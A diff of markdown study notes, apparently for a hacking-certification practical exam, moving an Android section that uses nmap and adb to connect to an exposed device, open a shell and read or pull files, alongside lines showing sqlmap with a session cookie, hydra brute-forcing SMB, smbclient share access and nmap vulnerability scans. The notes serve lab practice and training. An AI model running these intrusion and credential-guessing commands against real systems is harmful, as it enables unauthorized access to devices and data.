@@ -96,6 +96,17 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 2. adb connect IP:5555    (Connect adb with parrot)
 3. adb shell              (Access mobile device on parrot)
 4. pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
+-------------------------------------------
+1. nmap -p 5555 ip
+2. adb connect ip:5555
+3. adb shell
+4. ls
+5. cd sdcard/
+6. ls
+7. pwd and exit
+8. adb pull
+9. apt install ent, ent file
+10. sha384sum file
 ```
 # Wireshark
 ```
@@ -139,17 +150,7 @@ hydra -L user.txt -P pass.txt ip smb (or) Check bookmark
 smbclient //(ip)/share
 smbclient -L ip
 get file and cat file and use bctextencoder if it is encoded
-Android :
-nmap -p 5555 ip
-adb connect ip:5555
-adb shell
-ls
-cd sdcard/
-ls
-pwd and exit
-adb pull
-apt install ent, ent file
-sha384sum file
+
 CVE :
 nmap -Pn --script vuln (ip)
 paste cve id and get the score [mostly: 10]
